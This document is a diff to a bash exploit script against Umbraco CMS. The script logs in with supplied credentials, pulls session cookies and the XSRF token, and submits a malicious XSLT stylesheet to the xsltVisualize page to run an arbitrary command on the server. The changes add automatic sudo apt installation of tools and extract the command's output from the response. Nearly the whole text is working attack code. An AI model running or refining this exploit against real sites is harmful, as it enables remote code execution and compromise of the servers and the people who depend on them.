@@ -1,5 +1,20 @@
 #!/bin/bash
 
+# Dependency installation function
+install_dependencies() {
+    echo "[*] Checking and installing required dependencies..."
+    for tool in curl awk sed grep tr; do
+        if ! command -v $tool &> /dev/null; then
+            echo "[!] $tool not found. Installing..."
+            sudo apt update && sudo apt install -y $tool
+        fi
+    done
+}
+
+# Install missing dependencies
+install_dependencies
+
+# Check input arguments
 if [ "$#" -ne 4 ]; then
     echo "Usage: $0 <username> <password> <target_url> <full_command>"
     exit 1
@@ -30,15 +45,10 @@ public string xml() {
 </xsl:stylesheet>'
 
 echo "[*] Step 1 - Logging in..."
-# Use -D - to capture headers
 LOGIN_RESPONSE=$(curl -s -X POST -D - -H "Content-Type: application/json" \
     -d "{\"username\":\"$USERNAME\", \"password\":\"$PASSWORD\"}" \
     "$TARGET/umbraco/backoffice/UmbracoApi/Authentication/PostLogin")
 
-# Save response for debugging
-echo "$LOGIN_RESPONSE" > debug_login_response.txt
-
-# Extract cookies from the headers
 COOKIES=$(echo "$LOGIN_RESPONSE" | grep -oP 'Set-Cookie: \K[^;]+' | tr '\n' '; ')
 UMB_XSRF_TOKEN=$(echo "$COOKIES" | grep -oP 'UMB-XSRF-TOKEN=\K[^;]*')
 
@@ -50,9 +60,6 @@ echo "[+] Login successful!"
 
 echo "[*] Step 2 - Accessing XSLT Visualize page..."
 XS_RESPONSE=$(curl -s -H "Cookie: $COOKIES" "$TARGET/umbraco/developer/Xslt/xsltVisualize.aspx")
-
-# Save response for debugging
-echo "$XS_RESPONSE" > debug_xslt_response.html
 
 VIEWSTATE=$(echo "$XS_RESPONSE" | grep -oP '(?<=id="__VIEWSTATE" value=")[^"]*')
 VIEWSTATEGENERATOR=$(echo "$XS_RESPONSE" | grep -oP '(?<=id="__VIEWSTATEGENERATOR" value=")[^"]*')
@@ -75,13 +82,17 @@ ATTACK_RESPONSE=$(curl -s -H "Cookie: $COOKIES" \
     --data-urlencode "ctl00\$body\$visualizeDo=Visualize+XSLT" \
     "$TARGET/umbraco/developer/Xslt/xsltVisualize.aspx")
 
-# Save attack response for debugging
+# Save the response for debugging
 echo "$ATTACK_RESPONSE" > debug_attack_response.html
 
-if [[ $ATTACK_RESPONSE == *"result"* ]]; then
-    echo "[+] Payload executed successfully. Check the target!"
+# Extract the command output from <div id="result">
+COMMAND_OUTPUT=$(echo "$ATTACK_RESPONSE" | awk 'BEGIN{IGNORECASE=1}/<div id="result">/,/<\/div>/' | sed 's/<[^>]*>//g' | tr -d '\r')
+
+if [[ -n "$COMMAND_OUTPUT" ]]; then
+    echo "[+] Payload executed successfully. Command Output:"
+    echo -e "$COMMAND_OUTPUT"
 else
-    echo "[!] Exploit failed. Debugging recommended."
+    echo "[!] Exploit failed. Debugging recommended. Check debug_attack_response.html for details."
 fi
 
 echo "[*] Exploit completed."
